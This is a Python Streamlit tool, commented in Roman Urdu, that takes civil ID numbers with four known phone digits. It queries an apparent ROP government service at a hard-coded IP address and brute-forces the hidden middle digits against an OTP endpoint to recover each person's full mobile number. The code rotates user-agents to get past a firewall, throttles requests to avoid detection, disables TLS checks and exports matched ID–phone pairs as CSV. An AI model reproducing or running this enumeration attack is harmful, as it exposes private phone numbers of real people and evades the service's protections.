import concurrent.futures
import json
import random
import time
import pandas as pd
import requests
import streamlit as st
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

st.set_page_config(
    page_title="ROP Batch & Multi-Number Match Tool", page_icon="📱", layout="wide"
)

# Initialize session state
if "otp_results" not in st.session_state:
  st.session_state.otp_results = []
if "unmatched_results" not in st.session_state:
  st.session_state.unmatched_results = []
if "logs" not in st.session_state:
  st.session_state.logs = []


def log_message(msg):
  st.session_state.logs.append(msg)


# Realistic Browser User-Agents (Firewall Bypass karne ke liye)
USER_AGENTS = [
    (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)"
        " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148"
        " Safari/604.1"
    ),
    (
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML,"
        " like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    ),
]


def get_headers(host):
  return {
      "host": host,
      "content-type": "application/json",
      "accept": "application/json, text/plain, */*",
      "accept-encoding": "gzip, deflate",
      "user-agent": random.choice(USER_AGENTS),  # Dynamic User-Agent
      "connection": "keep-alive",
  }


def fetch_fresh_token_for_civil_id(host, civil_id, session):
  try:
    url = f"https://{host}/nrsPhone"
    payload = {"civilId": civil_id}
    headers = get_headers(host)

    # Timeout barha kar 15 sec kiya gaya hai
    resp = session.post(url, json=payload, headers=headers, timeout=15)
    data = json.loads(resp.text.strip())
    if "mobile" in data and data["mobile"]:
      return True, data
    return False, data
  except Exception as e:
    log_message(f"⚠️ NRS Token Error ({civil_id}): {str(e)}")
    return False, {}


def test_single_phone_fast(
    host, civil_id, phone, token_val, civil_id_token, session
):
  try:
    url = f"https://{host}/otp"
    payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
    headers = get_headers(host)

    resp = session.post(url, json=payload, headers=headers, timeout=15)
    resp_text = resp.text.strip()

    if resp_text and "token" in resp_text and "id" in resp_text:
      entry = {"civil_id": civil_id, "phone": phone}
      if entry not in st.session_state.otp_results:
        st.session_state.otp_results.append(entry)
      log_message(f"🎯 MATCH FOUND: Civil ID -> {civil_id} | Phone -> {phone}")
      return True
  except Exception as e:
    # Error detail log karein taake pata chale disconnect kyun hua
    pass
  return False


st.title("📱 ROP Batch File & Multi-Number Match Tool")
st.write(
    "Aik sath multiple IDs aur Last 4 digits enter karein, live match dekhein"
    " aur CSV download karein."
)

host = "5.37.58.147"

batch_text = st.text_area(
    "Enter CivilID, Last4Digits (Aik line mein ek, misal ke tor par: 5701982,"
    " 1944)",
    value="5701982, 1944",
    height=150,
)

col1, col2, col3 = st.columns(3)
start_search = col1.button("🚀 Start Batch Search", type="primary")
clear_btn = col3.button("🧹 Clear All Data")

if clear_btn:
  st.session_state.otp_results = []
  st.session_state.unmatched_results = []
  st.session_state.logs = []
  st.rerun()

if start_search:
  if not batch_text.strip():
    st.error("Pehle batch data enter karein!")
  else:
    lines = batch_text.split("\n")
    tasks_list = []
    seen_ids = set()

    for line in lines:
      line = line.strip()
      if not line or line.startswith("#"):
        continue
      parts = [p.strip() for p in line.replace(";", ",").split(",")]
      if len(parts) >= 2:
        cid = parts[0]
        last4 = parts[1]
        if (
            cid.isdigit()
            and last4.isdigit()
            and len(last4) == 4
            and cid not in seen_ids
        ):
          seen_ids.add(cid)
          tasks_list.append((cid, last4))

    if not tasks_list:
      st.error("Sahi format enter karein: CivilID, Last4Digits")
    else:
      st.success(
          f"Starting search for {len(tasks_list)} Unique Civil ID(s)..."
      )
      progress_bar = st.progress(0)
      total_tasks = len(tasks_list)

      session = requests.Session()
      session.verify = False

      for idx, (civil_id, suffix) in enumerate(tasks_list):
        success, data = fetch_fresh_token_for_civil_id(
            host, civil_id, session
        )

        if not success or not data or not data.get("mobile"):
          st.session_state.unmatched_results.append(
              {"civil_id": civil_id, "last_four": suffix}
          )
          progress_bar.progress((idx + 1) / total_tasks)
          continue

        mobile_dict = data.get("mobile", {})
        civil_id_token = data.get("civilId", "")
        matched_in_this_id = False

        for masked_num, token_val in mobile_dict.items():
          if matched_in_this_id:
            break
          clean_digits = "".join(filter(str.isdigit, masked_num))
          if len(clean_digits) < 2:
            continue
          prefix = clean_digits[:2]

          phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]

          # Batch size 5 se kam karke 3 kar di taake SIM firewall catch na kare
          batch_size = 3

          for i in range(0, len(phone_numbers), batch_size):
            if matched_in_this_id:
              break
            batch = phone_numbers[i : i + batch_size]

            with concurrent.futures.ThreadPoolExecutor(
                max_workers=batch_size
            ) as executor:
              futures = {
                  executor.submit(
                      test_single_phone_fast,
                      host,
                      civil_id,
                      phone,
                      token_val,
                      civil_id_token,
                      session,
                  ): phone
                  for phone in batch
              }
              for future in concurrent.futures.as_completed(futures):
                try:
                  if future.result():
                    matched_in_this_id = True
                    break
                except Exception:
                  pass

            # Chota sa delay taake SIM data block na kare
            time.sleep(0.1)

        if not matched_in_this_id:
          st.session_state.unmatched_results.append(
              {"civil_id": civil_id, "last_four": suffix}
          )

        progress_bar.progress((idx + 1) / total_tasks)

      st.success("Batch Search Complete!")
      st.rerun()

# Results Display Section
st.markdown("---")
res_col1, res_col2 = st.columns(2)

with res_col1:
  st.subheader("🎯 Matched Results")
  if st.session_state.otp_results:
    df_matched = pd.DataFrame(st.session_state.otp_results)
    st.dataframe(df_matched, use_container_width=True)
    csv_matched_data = df_matched.to_csv(index=False).encode("utf-8")
    st.download_button(
        "📥 Download Matched CSV",
        data=csv_matched_data,
        file_name="matched_results.csv",
        mime="text/csv",
    )
  else:
    st.info("No matches yet.")

with res_col2:
  st.subheader("⚠️ Unmatched Numbers")
  if st.session_state.unmatched_results:
    df_unmatched = pd.DataFrame(st.session_state.unmatched_results)
    st.dataframe(df_unmatched, use_container_width=True)
    csv_unmatched_data = df_unmatched.to_csv(index=False).encode("utf-8")
    st.download_button(
        "📥 Download Unmatched CSV",
        data=csv_unmatched_data,
        file_name="unmatched_results.csv",
        mime="text/csv",
    )
  else:
    st.info("No unmatched records.")

# Logs
if st.session_state.logs:
  st.markdown("---")
  st.subheader("📋 Logs")
  st.text_area(
      "Live Logs", value="\n".join(st.session_state.logs[-50:]), height=150
  )
